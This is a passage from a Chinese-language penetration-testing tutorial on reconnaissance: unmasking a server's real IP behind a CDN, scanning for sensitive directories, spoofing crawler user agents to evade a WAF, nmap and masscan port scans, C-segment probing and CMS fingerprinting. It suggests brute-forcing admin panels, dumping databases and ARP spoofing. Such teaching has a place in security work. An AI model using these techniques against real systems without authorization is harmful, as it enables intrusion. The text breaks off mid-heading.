<h3 id="32历史dns解析记录" class="headerLink">
    <a href="#32%e5%8e%86%e5%8f%b2dns%e8%a7%a3%e6%9e%90%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.2、历史DNS解析记录</h3><p>查询未使用CDN前的DNS服务器解析记录，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录</p>
<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://dnsdb.io/zh-cn/</a> DNS查询</p>
<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a> 微步在线</p>
<p><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener noreferrer">http://toolbar.netcraft.com/site_report?url=</a> 在线域名信息查询</p>
<p><a href="http://viewdns.info/" target="_blank" rel="noopener noreferrer">http://viewdns.info/</a> DNS、IP等查询</p>
<p><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener noreferrer">https://tools.ipip.net/cdn.php</a> CDN查询IP</p>
<h3 id="33邮件服务器" class="headerLink">
    <a href="#33%e9%82%ae%e4%bb%b6%e6%9c%8d%e5%8a%a1%e5%99%a8" class="header-mark"></a>3.3、邮件服务器</h3><p>大部分网站会有注册,订阅,找回密码的功能会发送邮件,因为邮件系统一般都在内部，所以就可以通过邮箱获得真实的IP，邮件头信息中会有真实IP</p>
<h3 id="34信息泄漏" class="headerLink">
    <a href="#34%e4%bf%a1%e6%81%af%e6%b3%84%e6%bc%8f" class="header-mark"></a>3.4、信息泄漏</h3><p>有些网站会有phpinfo页面,一些debug模式不关等信息泄漏问题，上面会有真实IP</p>
<h3 id="35网络空间搜索引擎" class="headerLink">
    <a href="#35%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>3.5、网络空间搜索引擎</h3><p>通过shadan、fofa等搜索引擎，通过对目标</p>
<p>网站的特征进行搜索，很多时候可以获取网站的真实IP</p>
<h3 id="36利用ssl证书查询" class="headerLink">
    <a href="#36%e5%88%a9%e7%94%a8ssl%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>3.6、利用SSL证书查询</h3><p><a href="https://censys.io/certificates/" target="_blank" rel="noopener noreferrer">https://censys.io/certificates/</a></p>
<h3 id="37国外访问" class="headerLink">
    <a href="#37%e5%9b%bd%e5%a4%96%e8%ae%bf%e9%97%ae" class="header-mark"></a>3.7、国外访问</h3><p>一般的站点在国内可能会有CDN，但是在国外的用户覆盖率比较低，所以通过国外的节点进行请求往往能获取真实IP</p>
<h3 id="38ltm解码法" class="headerLink">
    <a href="#38ltm%e8%a7%a3%e7%a0%81%e6%b3%95" class="header-mark"></a>3.8、LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时,通过对set-cookie关键字的解码真实ip也可被获取,例如：Set-Cookie:</p>
<p>BIGipServerpool_8.29_8030=487098378.24095.0000,先把第一小节的十进制数即487098378取出来,然后将其转为十六进制数1d08880a,接着从后至前,以此取四位数出来,也就是0a.88.08.1d,最后依次把他们转为十进制数10.136.8.29,也就是最后的真实ip。</p>
<h2 id="五基本目录敏感目录及文件" class="headerLink">
    <a href="#%e4%ba%94%e5%9f%ba%e6%9c%ac%e7%9b%ae%e5%bd%95%e6%95%8f%e6%84%9f%e7%9b%ae%e5%bd%95%e5%8f%8a%e6%96%87%e4%bb%b6" class="header-mark"></a>五、基本目录、敏感目录及文件</h2><p>由于发布网站时，服务器配置问题，导致目录浏览功能打开，从而引起信息泄露，造成安全隐患。在信息收集过程中，需要收集的敏感目录/文件信息包括：</p>
<p>1.robots.txt</p>
<p>2.crossdomin.xml</p>
<p>3.sitemap.xml</p>
<p>4.后台目录</p>
<p>5.网站安装包</p>
<p>6.网站上传目录</p>
<p>7.mysql管理页面</p>
<p>8.phpinfo</p>
<p>9.网站文本编辑器</p>
<p>10.测试文件</p>
<p>11.网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</p>
<p>12.DS_Store 文件</p>
<p>13.vim编辑器备份文件(.swp)</p>
<p>14.WEB—INF/web.xml文件</p>
<p>目录扫描对应信息收集来说特为重要，比如robots文件当中就可能泄露网站的后台或者CMS信息等，安装包中便泄露了网站的源码，phpinfo泄露了服务器的一些配置信息，编辑器、上传页面便可以进行利用相关的漏洞进行渗透，mysql、后台管理页面可以进行枚举爆破来尝试登陆进行下一步的安全测试。</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>
<p>后台目录：弱口令，万能密码，爆破</p>
<p>安装包：获取数据库信息，甚至是网站源码</p>
<p>上传目录：截断、上传图片马等</p>
<p>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</p>
<p>安装页面 ：可以二次安装进而绕过</p>
<p>phpinfo：会把你配置的各种信息暴露出来</p>
<p>编辑器：fck、ke、等</p>
<p>iis短文件利用：条件比较苛刻 windows、apache等</p>
<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可</p>
<p>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。</p>
<p>假如编写的robots.txt文件内容如下：</p>
<p>User-agent: *</p>
<p>Disallow: /data/</p>
<p>Disallow: /db/</p>
<p>Disallow: /admin/</p>
<p>Disallow: /manager/</p>
<p>Allow:/images/</p>
<p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p>
<h2 id="1dirsearch" class="headerLink">
    <a href="#1dirsearch" class="header-mark"></a>1、dirsearch</h2><p>工具地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">https://github.com/maurosoria/dirsearch</a></p>
<p>002_目录信息_dirsearch</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000006aspm1sAPkL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000006aspm1sAPkL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000006aspm1sAPkL.jpg">
        
    </a></p>
<h2 id="2dirbuster" class="headerLink">
    <a href="#2dirbuster" class="header-mark"></a>2、dirbuster</h2><p>工具地址：<a href="https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%20%28jar%20%2B%20lists%29%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist" target="_blank" rel="noopener noreferrer">https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%2520%2528jar%2520%252B%2520lists%2529%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist</a></p>
<p>当使用扫描工具对站点进行扫描，网站存在WAF后，会给我们的工具进行拦截，这时候我们需要修改User Agent值来绕过WAF的拦截，而DirBuster这款扫描工具便可以修改User Agent值</p>
<p>Mozilla/5.0 (compatible; Baiduspider/2.0; <a href="http://www.baidu.com/search/spider.html" target="_blank" rel="noopener noreferrer">http://www.baidu.com/search/spider.html</a>) 百度蜘蛛抓取欺骗</p>
<p>Mozilla/5.0 (compatible; Googlebot/2.1; <a href="http://www.google.com/bot.html" target="_blank" rel="noopener noreferrer">http://www.google.com/bot.html</a>) 谷歌蜘蛛抓取欺骗</p>
<p>Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) 百度转码浏览欺骗</p>
<p>Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14 谷歌转码浏览欺骗</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003eQkgF0RCOWT.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003eQkgF0RCOWT.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003eQkgF0RCOWT.jpg">
        
    </a></p>
<h2 id="37kbscan" class="headerLink">
    <a href="#37kbscan" class="header-mark"></a>3、7kbscan</h2><p>工具：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener noreferrer">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003yKP7p4OnhpH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003yKP7p4OnhpH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003yKP7p4OnhpH.jpg">
        
    </a></p>
<h2 id="4webrobot" class="headerLink">
    <a href="#4webrobot" class="header-mark"></a>4、Webrobot</h2><h2 id="5御剑" class="headerLink">
    <a href="#5%e5%be%a1%e5%89%91" class="header-mark"></a>5、御剑</h2><h2 id="6爬虫-中国菜刀" class="headerLink">
    <a href="#6%e7%88%ac%e8%99%ab-%e4%b8%ad%e5%9b%bd%e8%8f%9c%e5%88%80" class="header-mark"></a>6、爬虫-中国菜刀</h2><h2 id="7wwwscan" class="headerLink">
    <a href="#7wwwscan" class="header-mark"></a>7、wwwscan</h2><h2 id="8cansina" class="headerLink">
    <a href="#8cansina" class="header-mark"></a>8、cansina</h2><h2 id="9dirmap" class="headerLink">
    <a href="#9dirmap" class="header-mark"></a>9、dirmap</h2><h2 id="10webdirscan" class="headerLink">
    <a href="#10webdirscan" class="header-mark"></a>10、Webdirscan</h2><h2 id="11bbscan" class="headerLink">
    <a href="#11bbscan" class="header-mark"></a>11、BBscan</h2><h2 id="12gsil" class="headerLink">
    <a href="#12gsil" class="header-mark"></a>12、GSIL</h2><h2 id="六端口扫描" class="headerLink">
    <a href="#%e5%85%ad%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" class="header-mark"></a>六、端口扫描</h2><p>通过端口扫描可以判断出网站开启的服务，从而通过爆破枚举或者漏洞利用进行突破，进一步提升网站权限，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。</p>
<p>扫描到的端口也许是网站的一个旁站，可以尝试对旁站进行漏洞探测，但是有些服务开启的端口可能被管理员修改，通过手工判断分析即可（例如开启了8888端口，通过尝试远程桌面连接确定该端口为3389修改过的端口）。</p>
<h2 id="windows下的命令" class="headerLink">
    <a href="#windows%e4%b8%8b%e7%9a%84%e5%91%bd%e4%bb%a4" class="header-mark"></a>windows下的命令</h2><p>显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，</p>
<p>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等 ：netstat -a</p>
<p>以数字形式显示地址和端口号,显示所有已建立的有效连接：netstat -n</p>
<p>列出所有端口的情况：netstat -ano</p>
<p>查看被占用端口80对应的应用的PID：netstat -ano|findstr &ldquo;80&rdquo;</p>
<p>查看80端口被哪个进程或程序占用：tasklist|findstr &ldquo;80&rdquo;</p>
<p>结束该进程或程序：taskkill /f /t /im XX.exe</p>
<h2 id="1各服务开启的默认端口以及攻击方向" class="headerLink">
    <a href="#1%e5%90%84%e6%9c%8d%e5%8a%a1%e5%bc%80%e5%90%af%e7%9a%84%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bb%a5%e5%8f%8a%e6%94%bb%e5%87%bb%e6%96%b9%e5%90%91" class="header-mark"></a>1、各服务开启的默认端口以及攻击方向</h2><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004FQOZY2eFvo5.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004FQOZY2eFvo5.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004FQOZY2eFvo5.jpg">
        
    </a></p>
<h2 id="2在线查询网站" class="headerLink">
    <a href="#2%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2%e7%bd%91%e7%ab%99" class="header-mark"></a>2、在线查询网站</h2><p><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener noreferrer">http://coolaf.com/tool/port</a></p>
<p><a href="https://tool.lu/portscan/index.html" target="_blank" rel="noopener noreferrer">https://tool.lu/portscan/index.html</a></p>
<h2 id="3端口扫描工具" class="headerLink">
    <a href="#3%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e5%b7%a5%e5%85%b7" class="header-mark"></a>3、端口扫描工具</h2><p>端口扫描工具常见有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低，如果网站存在WAF可以通过调节扫描线程或者利用FTP连接工具、SSH连接工具、Mysql连接等工具进行手工探测</p>
<h3 id="31nmapzmap" class="headerLink">
    <a href="#31nmapzmap" class="header-mark"></a>3.1、nmap(zmap)</h3><p>Nmap扫描中一些常见的服务</p>
<p>msmq? ：默认对于的是1801端口，是 MSMQ Microsoft Message Queuing微软消息队列的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000NwwdS1a5DmQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000NwwdS1a5DmQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000NwwdS1a5DmQ.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000wP30Y3NAH3l.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000wP30Y3NAH3l.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000wP30Y3NAH3l.jpg">
        
    </a></p>
<p>msrpc：Microsoft Remote Procedure Call微软远程过程调用，是 Windows 操作系统使用的一个协议。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003iDerr35gQEE.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003iDerr35gQEE.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003iDerr35gQEE.jpg">
        
    </a></p>
<p>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003WyHIO0yeo26.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003WyHIO0yeo26.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003WyHIO0yeo26.jpg">
        
    </a></p>
<p>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000mQ24I3dHP5M.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000mQ24I3dHP5M.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000mQ24I3dHP5M.jpg">
        
    </a></p>
<h3 id="32masscan" class="headerLink">
    <a href="#32masscan" class="header-mark"></a>3.2、masscan</h3><h3 id="33scanport" class="headerLink">
    <a href="#33scanport" class="header-mark"></a>3.3、ScanPort</h3><p>通过ping等方式获取网站IP，然后开始扫描</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000032GE1n1a2yH9.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000032GE1n1a2yH9.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000032GE1n1a2yH9.jpg">
        
    </a></p>
<h3 id="34webrobot" class="headerLink">
    <a href="#34webrobot" class="header-mark"></a>3.4、webrobot</h3><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002gMvB70LlOUz.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002gMvB70LlOUz.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002gMvB70LlOUz.jpg">
        
    </a></p>
<h2 id="七旁站c段" class="headerLink">
    <a href="#%e4%b8%83%e6%97%81%e7%ab%99c%e6%ae%b5" class="header-mark"></a>七、旁站C段</h2><p>旁站：是和目标网站在同一台服务器上的其它网站</p>
<p>C端：是和服务器IP处在一个C段的其他服务器</p>
<p>对于防护比较强的主站，通常是很难挖掘到漏洞的，这时需要查看该站点的旁站，通过探测旁站的漏洞进行利用，从而拿下主站的权限。</p>
<p>当网站不存在旁站时，就需要进行C段探测（有些网站买断了相邻的几个IP做为分站，如果拿到分站的管理员敏感信息，如密码之类的，可以尝试对主站进行撞库），通过拿下C段中服务器进行ARP欺骗达到劫持域名的效果</p>
<p>对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<h2 id="1在线查询" class="headerLink">
    <a href="#1%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2" class="header-mark"></a>1、在线查询</h2><h3 id="11站点" class="headerLink">
    <a href="#11%e7%ab%99%e7%82%b9" class="header-mark"></a>1.1、站点</h3><p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener noreferrer">http://s.tool.chinaz.com/same</a></p>
<p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener noreferrer">https://dns.aizhan.com/</a></p>
<p><a href="http://www.5kik.com/c/" target="_blank" rel="noopener noreferrer"><strong>http://www.5kik.com/c/</strong></a> <strong>？登不上</strong></p>
<p><a href="https://webscan.cc/" target="_blank" rel="noopener noreferrer">https://webscan.cc/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001nb4i84abV24.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001nb4i84abV24.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001nb4i84abV24.jpg">
        
    </a></p>
<h3 id="12google-hackingbing" class="headerLink">
    <a href="#12google-hackingbing" class="header-mark"></a>1.2、Google Hacking、Bing</h3><p>site:125.125.125.*</p>
<p><a href="http://cn.bing.com/search?q=ip:111.111.111.111" target="_blank" rel="noopener noreferrer">http://cn.bing.com/search?q=ip:111.111.111.111</a></p>
<h3 id="12网络空间搜索引擎" class="headerLink">
    <a href="#12%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>1.2、网络空间搜索引擎</h3><p>fofa、shodan在线工具 语法:ip=&ldquo;106.15.141.18/24&rdquo;</p>
<h2 id="2探测工具" class="headerLink">
    <a href="#2%e6%8e%a2%e6%b5%8b%e5%b7%a5%e5%85%b7" class="header-mark"></a>2、探测工具</h2><h3 id="21k8cscan" class="headerLink">
    <a href="#21k8cscan" class="header-mark"></a>2.1、K8Cscan</h3><p><a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener noreferrer">https://github.com/k8gege/K8CScan</a></p>
<h3 id="22nmapmasscan" class="headerLink">
    <a href="#22nmapmasscan" class="header-mark"></a>2.2、nmap、masscan</h3><p>nmap -p 22,21,443,8080-Pn 172.178.40.0/24</p>
<p>nmap -p 80,8080 &ndash;open ip/24</p>
<p>masscan -p 22,21,443,8080-Pn &ndash;rate=1000172.178.40.0/24</p>
<h3 id="23goby" class="headerLink">
    <a href="#23goby" class="header-mark"></a>2.3、goby</h3><h3 id="24御剑" class="headerLink">
    <a href="#24%e5%be%a1%e5%89%91" class="header-mark"></a>2.4、御剑</h3><h3 id="25北极熊扫描器" class="headerLink">
    <a href="#25%e5%8c%97%e6%9e%81%e7%86%8a%e6%89%ab%e6%8f%8f%e5%99%a8" class="header-mark"></a>2.5、北极熊扫描器</h3><h3 id="26通过手动ping" class="headerLink">
    <a href="#26%e9%80%9a%e8%bf%87%e6%89%8b%e5%8a%a8ping" class="header-mark"></a>2.6、通过手动ping</h3><h2 id="八整站分析" class="headerLink">
    <a href="#%e5%85%ab%e6%95%b4%e7%ab%99%e5%88%86%e6%9e%90" class="header-mark"></a>八、整站分析</h2><h2 id="1服务器类型" class="headerLink">
    <a href="#1%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%b1%bb%e5%9e%8b" class="header-mark"></a>1、服务器类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
<p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000043w87T0xYfzx.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000043w87T0xYfzx.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000043w87T0xYfzx.jpg">
        
    </a></p>
<p>而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003cyx6v1y6YGw.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003cyx6v1y6YGw.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003cyx6v1y6YGw.jpg">
        
    </a></p>
<p>检测服务器平台、版本等，获取后可以制定漏洞挖掘方案（如IIS6.0存在解析漏洞等）。</p>
<p>将首页或者其他页面通过修改大小写辨别网站所使用的系统：</p>
<p>区分大小写（页面报错）&ndash;Linux</p>
<p>不区分大小写（页面正常）&ndash;Windows</p>
<h3 id="11-云悉web资产梳理" class="headerLink">
    <a href="#11-%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>1.1、 云悉WEB资产梳理</h3><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004KDwGh1JTNuf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004KDwGh1JTNuf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004KDwGh1JTNuf.jpg">
        
    </a></p>
<p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">http://www.yunsee.cn/</a>，根据IIS版本判断Windows系统，系统对应版本通过搜索引擎查找。</p>
<p><strong>注：使用AppScan、WVS等扫描工具也可以判断。</strong></p>
<h2 id="2网站容器" class="headerLink">
    <a href="#2%e7%bd%91%e7%ab%99%e5%ae%b9%e5%99%a8" class="header-mark"></a>2、网站容器</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<p>搭建网站的服务组件，例如：iis、Apache、nginx、tomcat等，通过网站容器判断存在的漏洞（如：Apache解析漏洞，nginx解析漏洞）。</p>
<h3 id="21火狐渗透测试浏览器" class="headerLink">
    <a href="#21%e7%81%ab%e7%8b%90%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e6%b5%8f%e8%a7%88%e5%99%a8" class="header-mark"></a>2.1、火狐渗透测试浏览器</h3><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003VX3YC3YJiMp.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003VX3YC3YJiMp.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003VX3YC3YJiMp.jpg">
        
    </a></p>
<h3 id="22云悉web资产梳理" class="headerLink">
    <a href="#22%e4%ba%91%e6%82%89web%e8%b5%84%e4%ba%a7%e6%a2%b3%e7%90%86" class="header-mark"></a>2.2、云悉WEB资产梳理\</h3><h2 id="23脚本类型" class="headerLink">
    <a href="#23%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>2.3、脚本类型</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
<p>1）可以根据网站URL来判断</p>
<p>2）site:xxx filetype:php</p>
<p>3）可以根据Firefox的插件来判断</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002wPaT40TvDj1.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002wPaT40TvDj1.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002wPaT40TvDj1.jpg">
        
    </a></p>
<h3 id="31通过修改首页文件后缀查看页面响应判断" class="headerLink">
    <a href="#31%e9%80%9a%e8%bf%87%e4%bf%ae%e6%94%b9%e9%a6%96%e9%a1%b5%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e6%9f%a5%e7%9c%8b%e9%a1%b5%e9%9d%a2%e5%93%8d%e5%ba%94%e5%88%a4%e6%96%ad" class="header-mark"></a>3.1、通过修改首页文件后缀查看页面响应判断</h3><p>通过修改index.xxx后缀内容（为ASP\ASPX\PHP\JSP），查看页面返回情况，页面返回正常便可以判断脚本类型，判断脚本类型是信息收集中最基本的工作之一。</p>
<h3 id="32通过搜索框查找相关文章辨别脚本类型" class="headerLink">
    <a href="#32%e9%80%9a%e8%bf%87%e6%90%9c%e7%b4%a2%e6%a1%86%e6%9f%a5%e6%89%be%e7%9b%b8%e5%85%b3%e6%96%87%e7%ab%a0%e8%be%a8%e5%88%ab%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.2、通过搜索框查找相关文章辨别脚本类型</h3><p>在网站搜索框中输入任意字符，查询后，通过浏览器上的URL判断网站脚本类型。</p>
<h3 id="33通过爬虫工具爬取网站目录判断网站脚本类型" class="headerLink">
    <a href="#33%e9%80%9a%e8%bf%87%e7%88%ac%e8%99%ab%e5%b7%a5%e5%85%b7%e7%88%ac%e5%8f%96%e7%bd%91%e7%ab%99%e7%9b%ae%e5%bd%95%e5%88%a4%e6%96%ad%e7%bd%91%e7%ab%99%e8%84%9a%e6%9c%ac%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.3、通过爬虫工具爬取网站目录判断网站脚本类型</h3><p>Webrobot</p>
<h2 id="4cms类型" class="headerLink">
    <a href="#4cms%e7%b1%bb%e5%9e%8b" class="header-mark"></a>4、CMS类型</h2><p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。这是我们想要识别这些网站的指纹，我们就可以利用以下一些指纹识别在线网站。</p>
<p>识别dedecms、phpcms、emlog、帝国cms等，通过网站使用的CMS找取该CMS已经公布的漏洞进行利用，进一步渗透网站。</p>
<h3 id="41云悉指纹" class="headerLink">
    <a href="#41%e4%ba%91%e6%82%89%e6%8c%87%e7%ba%b9" class="header-mark"></a>4.1、云悉指纹</h3><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener noreferrer">https://www.yunsee.cn/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001aYEoP2gsnQ7.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001aYEoP2gsnQ7.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001aYEoP2gsnQ7.jpg">
        
    </a></p>
<h3 id="42threatscan" class="headerLink">
    <a href="#42threatscan" class="header-mark"></a>4.2、ThreatScan</h3><p><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener noreferrer">https://scan.top15.cn/web/</a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003NRYiA4S9XWt.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003NRYiA4S9XWt.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003NRYiA4S9XWt.jpg">
        
    </a></p>
<h3 id="43wappalyzer" class="headerLink">
